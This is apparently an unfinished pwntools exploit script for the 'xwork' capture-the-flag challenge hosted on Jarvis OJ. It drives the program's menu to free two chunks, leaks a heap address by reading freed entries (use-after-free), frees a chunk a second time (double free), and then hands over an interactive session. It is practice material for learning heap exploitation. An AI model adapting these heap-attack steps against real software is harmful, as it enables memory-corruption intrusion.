#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./xwork"
libcPath = ""
remoteAddr = "pwn2.jarvisoj.com"
remotePort = 9897

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    # env = {'LD_PRELOAD': ''}
    # io = process("", env = env)
    io = process(elfPath)
    libc = elf.libc

else:
    context.log_level = "info"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(pidof(io)[0])).readlines()[1], 16)
        cmd = ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd = ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

def init():
    io.sendafter(":", "m4x")

def add(payload):
    io.sendafter("Exit\n", "1")
    io.send(payload)

def show(idx):
    io.sendafter("Exit\n", "2")
    io.sendafter(":", str(idx))

def edit(idx, payload):
    io.sendafter("Exit\n", "3")
    io.sendafter(":", str(idx))
    io.send(payload)

def delete(idx):
    io.sendafter("Exit\n", "4")
    io.sendafter(":", str(idx))

if __name__ == "__main__":
    init()
    add('0000')
    add('1111')
    delete(0)
    delete(1)
    show(0)
    show(1)
    heapBase = u64(io.recvn(8))
    success("heapBase", heapBase)
    pause()

    #  DEBUG([0x400CCD])
    delete(0)
    
    io.interactive()
    io.close()
